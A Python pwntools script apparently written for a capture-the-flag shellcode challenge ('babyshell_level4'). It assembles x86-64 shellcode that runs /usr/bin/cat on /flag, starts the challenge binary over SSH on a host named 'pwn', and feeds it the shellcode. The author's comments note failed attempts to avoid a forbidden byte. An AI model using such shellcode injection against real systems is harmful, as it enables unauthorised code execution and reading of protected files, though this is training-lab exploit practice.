#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'amd64'

shellcode=f"""
push {u32(b"/cat")} 
push {u32(b"/usr")}  /* /usr */
mov dword ptr [rsp+4], {u32(b"/bin")}  # b'/bin/cat'
push rsp
pop rdi
push {u32(b"/fla")} 
mov dword ptr [rsp+4], {u8(b"g")} 
push rsp
pop rsi
push 0
push rsi
push rdi
push rsp
pop rsi
push 0
pop rdx
push 0x3b
pop rax
syscall
"""
# both not working, how to prevent 48 opcode in 64 bit mode? 
#shellcode=pwnlib.shellcraft.i386.linux.cat("/flag")
#shellcode=pwnlib.shellcraft.amd64.linux.sh()
shellcode=(asm(shellcode))


print('1', disasm(shellcode))
#ELF.from_bytes(shellcode).debug().interactive()


def btos(n):
    return n.decode('UTF-8')
    
s = ssh(host="pwn")
f = SSHPath('/tmp/my_script.py', ssh=s)
f.touch()
f.write_text('import subprocess; subprocess.run("/challenge/babyshell_level4")')
p = s.process(['python', '/tmp/my_script.py'])
r = p.recvuntil(b"Reading 0x1000 bytes from stdin.")
print(r.decode())


shellcode=bytes(shellcode)
p.send(shellcode)
print(p.recvall().decode("UTF-8"))